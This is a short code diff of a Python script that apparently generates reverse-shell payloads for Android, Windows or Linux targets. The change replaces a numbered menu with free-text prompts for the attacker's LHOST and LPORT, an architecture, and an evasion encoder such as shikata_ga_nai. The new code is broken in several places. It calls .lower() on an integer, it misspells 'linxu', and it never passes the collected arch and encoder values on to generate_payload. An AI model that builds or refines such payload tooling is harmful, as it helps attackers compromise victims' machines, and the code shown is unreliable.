@@ -14,13 +14,11 @@ print("""
 
 def main():
     show_banner()
-    print("Target OS:")
-    print("1. Android")
-    print("2. Windows")
-    print("3. Linux")
-    platform = int(input("Select target OS: 1 | 2 | 3 : "))
+    platform = int(input("Select target OS: android | windows | linxu: ")).lower()
     lhost = input("LHOST (your IP): ").strip()
     lport = input("LPORT (listening port): ").strip()
+    arch = input("Architecture (x86 | x64): ").strip()
+    encoder = input("Encoder (e.g., x86 | shikata_ga_nai): ").strip()
     outfile = input("Output file name (no extension): ").strip()
 
     payload, outformat = generate_payload(platform, lhost, lport, outfile)
